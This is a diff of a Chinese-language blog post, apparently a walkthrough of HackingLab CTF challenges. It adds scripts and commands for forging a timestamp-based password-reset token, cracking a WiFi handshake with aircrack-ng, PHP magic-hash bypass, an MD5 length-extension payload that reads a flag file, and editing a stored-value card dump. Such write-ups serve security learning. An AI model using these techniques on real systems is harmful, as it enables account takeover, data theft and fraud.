@@ -403,46 +403,197 @@
             </figure>
 <h4 id="Principle很重要的XSS"><a href="#Principle很重要的XSS" class="headerlink" title="Principle很重要的XSS"></a>Principle很重要的XSS</h4><p>这题跟上题类似，但是只是<code>input框</code>变成了<code>href</code>,我用上题的payload直接就得到key了。不清楚为什么给了这么多hint</p>
 <figure class="image-box">
-                <img src="31.jpg" alt="" title="" class="">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74204887.jpg" alt="" title="" class="">
                 <p></p>
             </figure>
 <p>这些XSS的题目都可以用bp抓<code>响应包</code>来做，应该是后端没有做防护，这里就用最后一个题目做示范<br>首先抓到<code>请求包</code>，右键选择</p>
 <figure class="image-box">
-                <img src="32.jpg" alt="" title="" class="">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74603677.jpg" alt="" title="" class="">
                 <p></p>
             </figure>
 <p>点击<code>Forward</code>，此时可以看到<code>响应包</code>也就是<code>response</code>包，<br>在下方输入<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=haha onerror=alert(HackingLab)&gt;</span><br></pre></td></tr></table></figure></p>
 <p>再点击<code>Forward</code>，因为数据包有点多，所以一直点击<code>Forward</code>直到弹窗就行，弹窗之后还需要点击<code>Forward</code>得到后台给的key，同样能得到<code>key</code></p>
 <figure class="image-box">
-                <img src="33.jpg" alt="" title="" class="">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/10523935.jpg" alt="" title="" class="">
                 <p></p>
             </figure>
 <h3 id="注入关"><a href="#注入关" class="headerlink" title="注入关"></a>注入关</h3><p>注入关暂时做不了，题目服务器有问题</p>
 <h3 id="上传关"><a href="#上传关" class="headerlink" title="上传关"></a>上传关</h3><h4 id="请上传一张jpg格式的图片1"><a href="#请上传一张jpg格式的图片1" class="headerlink" title="请上传一张jpg格式的图片1"></a>请上传一张jpg格式的图片1</h4><p>这题试了几次之后发现是前端验证,上传一个jpg，然后用bp抓包改一下即可拿到key</p>
 <figure class="image-box">
-                <img src="34.jpg" alt="" title="" class="">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/74649040.jpg" alt="" title="" class="">
                 <p></p>
             </figure>
 <h4 id="请上传一张jpg格式的图片2"><a href="#请上传一张jpg格式的图片2" class="headerlink" title="请上传一张jpg格式的图片2"></a>请上传一张jpg格式的图片2</h4><p>跟第一题一样的做法。</p>
 <h4 id="请上传一张jpg格式的图片3"><a href="#请上传一张jpg格式的图片3" class="headerlink" title="请上传一张jpg格式的图片3"></a>请上传一张jpg格式的图片3</h4><p>这题后端也做了验证，可以先用前面题目的方法试试，发现提交成功但是没有返回key</p>
 <figure class="image-box">
-                <img src="35.jpg" alt="" title="" class="">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/56022428.jpg" alt="" title="" class="">
                 <p></p>
             </figure>
 <p>试了试加一个.jpg</p>
 <figure class="image-box">
-                <img src="36.jpg" alt="" title="" class="">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/3655210.jpg" alt="" title="" class="">
                 <p></p>
             </figure>
 <p>后端代码可能是验证文件名有没有<code>.jpg</code>，拿到key</p>
-
+<h3 id="解密关"><a href="#解密关" class="headerlink" title="解密关"></a>解密关</h3><h4 id="以管理员身份登录系统"><a href="#以管理员身份登录系统" class="headerlink" title="以管理员身份登录系统"></a>以管理员身份登录系统</h4><p>打开题目发现这是一个标准的登录框，有<code>忘记密码</code>功能，并且题目提示重置管理员密码就能得到<code>key</code>，<br>先了解一下重置密码功能，在这个输入框中输入的值会被传到后端进行重置，<br>然后给出<code>重置密码链接</code>，但是<code>admin</code>用户重置之后没有提示,</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/83610629.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>所以我们照常在每个页面都抓包试一试，在这个页面可以看到<code>重置密码链接</code>提交的值中有两个参数，<br>一个是<code>sukey</code>，一个是<code>username</code></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/2536875.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>将<code>username</code>改为<code>admin</code>，发现什么都没有显示:</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/64114422.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>现在只能看另一个参数<code>sukey</code>了，长度看起来像<code>md5</code>，<a href="https://www.somd5.com/" target="_blank" rel="noopener">md5解密</a>试试：</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23208333.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>解出来是一个<code>时间戳</code>，转为北京时间是<code>2018/7/19 14:5:54</code></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15833912.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>就是我刚刚提交的时间，所以思路大概就是将上传的时间转为<code>Unix时间戳</code>，然后<code>md5</code>加密，<br>将<code>sukey</code>和<code>username</code>分别等于<code>md5加密后的时间戳</code>和<code>admin</code>提交，<br>并且响应包得到的时间是比实际时间少的，</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/15606099.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>这里给出两种做法</p>
+<ul>
+<li>第一种是手动将响应包里的时间手动转为<code>Unix时间戳</code></li>
+<li>第二种是用脚本获取响应包的时间</li>
+</ul>
+<p>第一种：</p>
+<p>先提交<code>username</code>为<code>admin</code>，然后记录下<code>响应头</code>的<code>date</code></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23317299.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>然后去<a href="http://tool.chinaz.com/Tools/unixtime.aspx" target="_blank" rel="noopener">在线网站</a>转为时间戳,<br>记住小时需要跟北京时间一样，其他都一样</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/70214163.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>将<code>sukey</code>等于<code>时间戳md5加密后的值</code>访问即可，</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34392445.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/97004605.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>得到key</p>
+<p>第二种是用python，但是<code>time()</code>函数得到的当前时间戳与上传时的对不上，<br>所以只能与手动的方法一样，从响应头里获取时间。<br>附上脚本:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">import requests,hashlib,time,re</span><br><span class="line"></span><br><span class="line">def month(month):</span><br><span class="line">	months = [&quot;Jua&quot;,&quot;Feb&quot;,&quot;Mar&quot;,&quot;Apr&quot;,&quot;May&quot;,&quot;Jun&quot;,&quot;Jul&quot;,&quot;Aug&quot;,&quot;Sep&quot;,&quot;Oct&quot;,&quot;Nov&quot;,&quot;Dec&quot;]</span><br><span class="line">	for a in range(0,len(months)):</span><br><span class="line">		if months[a] == month:</span><br><span class="line">			return a+1</span><br><span class="line"></span><br><span class="line">r = requests.session()</span><br><span class="line">url = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/resetpassword.php&apos;</span><br><span class="line">post = &#123;&apos;username&apos;:&apos;admin&apos;&#125;</span><br><span class="line">a = r.post(url,data = post)</span><br><span class="line">list = re.compile(r&apos;[\,\s\:]+&apos;).split(a.headers[&apos;date&apos;])</span><br><span class="line">ct = (list[3]+&apos;-&apos;+str(month(list[2]))+&apos;-&apos;+list[1]+&apos; &apos;+str(int(list[4])+8)+&apos;:&apos;+list[5]+&apos;:&apos;+list[6])</span><br><span class="line">sukey = hashlib.new(&apos;md5&apos;,str(int(time.mktime(time.strptime(ct,&apos;%Y-%m-%d %H:%M:%S&apos;)))).encode(encoding=&apos;utf-8&apos;)).hexdigest()</span><br><span class="line">url2 = &apos;http://lab1.xseclab.com/password1_dc178aa12e73cfc184676a4100e07dac/reset.php?sukey=&apos;+sukey+&apos;&amp;username=admin&apos;</span><br><span class="line">print(r.get(url2).text)</span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/92437870.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<h4 id="邂逅对门的妹纸"><a href="#邂逅对门的妹纸" class="headerlink" title="邂逅对门的妹纸"></a>邂逅对门的妹纸</h4><p>这题给的是一个<code>wifi的握手包</code>，kali中有专门的工具来破解握手包<code>aircrack</code>，<br>但是需要字典，给了<code>年级和年份</code>，估计密码就是生日了，<br>先从网上下载一个生日字典，也可以自己生成<br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">aircrack-ng wifi-crack.cap -w pass.txt</span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/9407114.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>得到生日密码之后按照题目要求加密提交即可</p>
+<h4 id="万恶的Cisco"><a href="#万恶的Cisco" class="headerlink" title="万恶的Cisco"></a>万恶的Cisco</h4><p>直接<code>GoogleCisco破解</code>,<a href="http://www.toolsxx.com/code/cisco.php" target="_blank" rel="noopener">Cisco思科密码在线解密</a></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/72556291.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<h4 id="万恶的加密"><a href="#万恶的加密" class="headerlink" title="万恶的加密"></a>万恶的加密</h4><p>huawei交换机的加密方式，有人写过<a href="https://github.com/grutz/h3c-pt-tools" target="_blank" rel="noopener">python工具</a><br>使用方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">python27 hh3c_cipher.py -c &quot;aK9Q4I)J&apos;#[Q=^Q`MAF4&lt;1!!&quot;</span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/54131428.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<h4 id="喜欢泡网吧的小明"><a href="#喜欢泡网吧的小明" class="headerlink" title="喜欢泡网吧的小明"></a>喜欢泡网吧的小明</h4><p>给的是一个<code>dump</code>文件，里头的内容有些看不懂，看了网上的wp才知道做的，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">首先将当下的数据不做改动，进行刷卡，显示卡片异常。说明，卡片的头信息错误。一般的卡片的头信息应该是前8~16个字节。头信息应该有个开始和结束标准信息。</span><br></pre></td></tr></table></figure></p>
+<p>直接将文件上传的话会显示<code>卡片异常</code>，并且题目提示了有一个字节产生了错误。</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/23883661.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>网上给的wp是将开头的<code>AA</code>变为<code>8A</code>, 原因是头部信息错误所以读取失败，具体为什么改为<code>8A</code>也不清楚，<br>但是改为<code>8A</code>后，提示:</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/95794273.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>可以正常刷卡了，但是余额为100，往下看文件内容，有<code>1027</code>，转为10进制是<code>4135</code>，没有啥关系，<br>但是这些卡的加密方式是有可能倒叙的，所以再试试<code>2710</code>，可以发现刚好是<code>10000</code>，对应的是100.00，所以我们现在只需要将<code>20000</code>转为16进制，然后倒序即可,将两个<code>1027</code>的值改为<code>204E</code>，保存再上传即可</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/99847806.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<h4 id="异常数据"><a href="#异常数据" class="headerlink" title="异常数据"></a>异常数据</h4><p>题目给出一段加密后的字符<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">AGV5IULSB3ZLVSE=</span><br></pre></td></tr></table></figure></p>
+<p>数字和字母，估计是base32，但是base32解不出，所以大概率是base64，只是把其中的小写字母换成了大写，<br>base64是3位为一组，加密成4个字节，所以分成<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">AGV5</span><br><span class="line">IULS</span><br><span class="line">B3ZL</span><br><span class="line">VSE=</span><br></pre></td></tr></table></figure></p>
+<p>首先看看第一次解密:</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/50682055.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>出了乱码，所以将A改为小写</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/34427238.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>可以发现思路就是这样，<code>hey</code>已经出来了，所以可以进行下一组，重复这个步骤即可</p>
+<p>最终为</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">aGV5</span><br><span class="line">IUls</span><br><span class="line">b3Zl</span><br><span class="line">VSE=</span><br></pre></td></tr></table></figure>
+<p><a href="http://www.qqxiuzi.cn/bianma/base64.htm" target="_blank" rel="noopener">解码链接</a></p>
+<h4 id="md5真的能碰撞嘛"><a href="#md5真的能碰撞嘛" class="headerlink" title="md5真的能碰撞嘛?"></a>md5真的能碰撞嘛?</h4><p>题目点击<code>__</code>后，可以直接看到源码，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$flag=FLAG;</span><br><span class="line">if(isset($_POST[&quot;password&quot;]))&#123;</span><br><span class="line">	$password=$_POST[&apos;password&apos;];</span><br><span class="line">    $rootadmin=&quot;!1793422703!&quot;;</span><br><span class="line">    if($password==$rootadmin)&#123;die(&quot;Please do not attack admin account!&quot;);&#125;</span><br><span class="line">    </span><br><span class="line">    if(md5($password)==md5($rootadmin))&#123;</span><br><span class="line">        echo $flag;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">        die(&quot;Password Error!&quot;);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p>
+<p>大概意思就是<code>$rootadmin</code>的md5要跟上传上去的值的md5一样，而且本身的值也不能一样<br>先看看<code>!1793422703!</code>的md5是多少,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0e332932043729729062996282883873</span><br></pre></td></tr></table></figure></p>
+<p>0e后面全是数字，php弱类型，POST<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">password=240610708或者QNKCDZO</span><br></pre></td></tr></table></figure></p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/89887581.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>拿到key</p>
+<h4 id="小明爱上了一个搞硬件的小姑凉"><a href="#小明爱上了一个搞硬件的小姑凉" class="headerlink" title="小明爱上了一个搞硬件的小姑凉"></a>小明爱上了一个搞硬件的小姑凉</h4><p>题目给的是一个<code>logicdata</code>文件，提示是一个逻辑分析仪抓包数据，<br>winhex打开之后，在文件的最后有一串英文，</p>
+<figure class="image-box">
+                <img src="http://cherry-gk.oss-cn-beijing.aliyuncs.com/18-7-20/5595813.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>搜一搜<code>saleae</code>,发现需要下载这个公司的软件才能解密<br><a href="https://www.saleae.com/zh/downloads/" target="_blank" rel="noopener">下载链接</a><br>下载完用这个号软件打开之后即可看到答案，英文不好的同学注意，<code>COMMA</code>是逗号的意思</p>
+<figure class="image-box">
+                <img src="59.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<h4 id="有签名限制的读取任意文件"><a href="#有签名限制的读取任意文件" class="headerlink" title="有签名限制的读取任意文件"></a>有签名限制的读取任意文件</h4><p>右键查看源代码可以看到部分代码</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&quot;Content-type:text/html;charset=utf-8&quot;);</span><br><span class="line">include &quot;_flag.php&quot;;</span><br><span class="line">include &quot;salt.php&quot;;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">$mysalt=SALT;</span><br><span class="line"></span><br><span class="line">if(isset($_GET[&apos;filepath&apos;])&amp;&amp;!empty($_GET[&apos;filepath&apos;]) &amp;&amp;isset($_GET[&apos;sign&apos;]) &amp;&amp;!empty($_GET[&apos;sign&apos;]))&#123;</span><br><span class="line">	myreadfile($_GET[&apos;filepath&apos;],$mysalt,$_GET[&apos;sign&apos;]);</span><br><span class="line">	</span><br><span class="line">&#125;</span><br><span class="line">else&#123;</span><br><span class="line">	//降低一点复杂度</span><br><span class="line">	var_dump(strlen($mysalt));</span><br><span class="line">	testsign(&quot;/etc/hosts&quot;,$mysalt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">function myhash($message,$mysalt)&#123;</span><br><span class="line">		return md5($mysalt.$message);</span><br><span class="line">&#125;</span><br><span class="line">function checksign($message,$mysalt,$sign)&#123;</span><br><span class="line">    if($sign==myhash($message,$mysalt))&#123;</span><br><span class="line">    	return True;</span><br><span class="line">    &#125;else&#123;</span><br><span class="line">    	return False;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function myreadfile($filepath,$mysalt,$sign)&#123;</span><br><span class="line">	$res=checksign($filepath,$mysalt,$sign);</span><br><span class="line">    if($res)&#123;</span><br><span class="line">    	echo getfile($filepath);</span><br><span class="line">    &#125;</span><br><span class="line">    else&#123;</span><br><span class="line">    	echo &apos;sign error!&apos;;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line">function testsign($filepath,$mysalt)&#123;</span><br><span class="line">	echo myhash($filepath,$mysalt);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">echo &quot;&lt;!--&quot;.file_get_contents(__FILE__);</span><br></pre></td></tr></table></figure>
+<p>题目已经给出提示<code>MD5 Length Extension Attack!</code>，md5长度扩展攻击，<br>先看看代码，可以知道的是已知<code>md5</code>，已知<code>salt的长度</code>，还知道<code>/etc/hosts</code>,<br>这里给出<a href="https://github.com/bwall/HashPump" target="_blank" rel="noopener">工具下载链接</a><br>使用方法：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">$ hashpump -h</span><br><span class="line">HashPump [-h help] [-t test] [-s signature] [-d data] [-a additional] [-k keylength]</span><br><span class="line">    HashPump generates strings to exploit signatures vulnerable to the Hash Length Extension Attack.</span><br><span class="line">    -h --help          Display this message.</span><br><span class="line">    -t --test          Run tests to verify each algorithm is operating properly.</span><br><span class="line">    -s --signature     The signature from known message.</span><br><span class="line">    -d --data          The data from the known message.</span><br><span class="line">    -a --additional    The information you would like to add to the known message.</span><br><span class="line">    -k --keylength     The length in bytes of the key being used to sign the original message with.</span><br><span class="line">    Version 1.2.0 with CRC32, MD5, SHA1, SHA256 and SHA512 support.</span><br><span class="line">    &lt;Developed by bwall(@botnet_hunter)&gt;</span><br></pre></td></tr></table></figure></p>
+<p>安装方法<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">git clone https://github.com/bwall/HashPump</span><br><span class="line">apt-get install g++ libssl-dev</span><br><span class="line">cd HashPump</span><br><span class="line">make install</span><br></pre></td></tr></table></figure></p>
+<p>这里我们知道的是<code>signature</code>、<code>data</code>、<code>keylength</code>,需要读取的文件这里写成<code>_flag.php</code><br>所以工具使用：</p>
+<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">hashpump -s f3d366138601b5afefbd4fc15731692e -d /etc/hosts -k 32 -a /etc/_flag.php</span><br></pre></td></tr></table></figure>
+<figure class="image-box">
+                <img src="60.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>提交时需要把<code>\x</code>换成<code>%</code>，因为是URL编码的<br>最终的payload是：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">http://lab1.xseclab.com/decrypt1_53a52adb49c55c8daa5c8ee0ff59befe/md5_le.php?filepath=/etc/hosts%80%00%00%00%00%00%00%00%00%00%00%00%00%00P%01%00%00%00%00%00%00/etc/_flag.php&amp;sign=7fbbac6efeb7939be04829bc9a847f0c</span><br></pre></td></tr></table></figure></p>
+<h4 id="美丽的邂逅与密码器的开门密码"><a href="#美丽的邂逅与密码器的开门密码" class="headerlink" title="美丽的邂逅与密码器的开门密码"></a>美丽的邂逅与密码器的开门密码</h4><p>这题题目给的一个exe文件，名字还是<code>reverse</code>,逆向题，IDA打开之后找到主函数</p>
+<figure class="image-box">
+                <img src="61.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>可以看到当<code>v19</code>等于<code>1</code>的时候才会输出一段字符，找到<code>401005</code>函数，<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">int __cdecl sub_401005(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  return sub_401020(a1);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>又跳到了<code>401020</code>,<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line">BOOL __cdecl sub_401020(char *a1)</span><br><span class="line">&#123;</span><br><span class="line">  char v2; // [sp+Ch] [bp-44h]@1</span><br><span class="line">  int v3; // [sp+4Ch] [bp-4h]@1</span><br><span class="line"></span><br><span class="line">  memset(&amp;v2, 0xCCu, 0x44u);</span><br><span class="line">  v3 = 0;</span><br><span class="line">  v3 = strlen(a1);</span><br><span class="line">  return v3 &gt; 50;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p>
+<p>可以看出来当<code>v20</code>的长度大于<code>50</code>就能返回<code>true</code>，也就是<code>1</code><br>运行程序，输入任意字符，长度大于50:</p>
+<figure class="image-box">
+                <img src="62.jpg" alt="" title="" class="">
+                <p></p>
+            </figure>
+<p>得到key</p>
+<h4 id="综合关"><a href="#综合关" class="headerlink" title="综合关"></a>综合关</h4>
         </div>
         
 <blockquote class="post-copyright">
     <div class="content">
         
 <span class="post-time">
-    Last updated: <time datetime="2018-07-14T09:31:36.251Z" itemprop="dateUpdated">2018-07-14 17:31:36</time>
+    Last updated: <time datetime="2018-07-20T01:45:38.125Z" itemprop="dateUpdated">2018-07-20 09:45:38</time>
 </span><br>
 
 
@@ -542,7 +693,7 @@
         <aside class="post-widget">
             <nav class="post-toc-wrap" id="post-toc">
                 <strong>目录</strong>
-                <ol class="post-toc"><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#基础关"><span class="post-toc-number">1.</span> <span class="post-toc-text">基础关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key在哪里"><span class="post-toc-number">1.1.</span> <span class="post-toc-text">key在哪里?</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#再加密一次你就得到key啦"><span class="post-toc-number">1.2.</span> <span class="post-toc-text">再加密一次你就得到key啦~</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#猜猜这是经过了多少次加密？"><span class="post-toc-number">1.3.</span> <span class="post-toc-text">猜猜这是经过了多少次加密？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#据说MD5加密很安全，真的是么？"><span class="post-toc-number">1.4.</span> <span class="post-toc-text">据说MD5加密很安全，真的是么？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#种族歧视"><span class="post-toc-number">1.5.</span> <span class="post-toc-text">种族歧视</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#HAHA浏览器"><span class="post-toc-number">1.6.</span> <span class="post-toc-text">HAHA浏览器</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key究竟在哪里呢？"><span class="post-toc-number">1.7.</span> <span class="post-toc-text">key究竟在哪里呢？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key又找不到了"><span class="post-toc-number">1.8.</span> <span class="post-toc-text">key又找不到了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#冒充登陆用户"><span class="post-toc-number">1.9.</span> <span class="post-toc-text">冒充登陆用户</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#比较数字大小"><span class="post-toc-number">1.10.</span> <span class="post-toc-text">比较数字大小</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#本地的诱惑"><span class="post-toc-number">1.11.</span> <span class="post-toc-text">本地的诱惑</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#就不让你访问"><span class="post-toc-number">1.12.</span> <span class="post-toc-text">就不让你访问</span></a></li></ol></li><li class="post-toc-item post-toc-level-3"><a class="post-toc-link" href="#脚本关"><span class="post-toc-number">2.</span> <span class="post-toc-text">脚本关</span></a><ol class="post-toc-child"><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#key又又找不到了"><span class="post-toc-number">2.1.</span> <span class="post-toc-text">key又又找不到了</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#快速口算"><span class="post-toc-number">2.2.</span> <span class="post-toc-text">快速口算</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#这个题目是空的"><span class="post-toc-number">2.3.</span> <span class="post-toc-text">这个题目是空的</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#怎么就是不弹出key呢？"><span class="post-toc-number">2.4.</span> <span class="post-toc-text">怎么就是不弹出key呢？</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比验证码第一期"><span class="post-toc-number">2.5.</span> <span class="post-toc-text">逗比验证码第一期</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比验证码第二期"><span class="post-toc-number">2.6.</span> <span class="post-toc-text">逗比验证码第二期</span></a></li><li class="post-toc-item post-toc-level-4"><a class="post-toc-link" href="#逗比的验证码第三期（SESSION）"><span class="post-toc-number">2.7.</span> <span 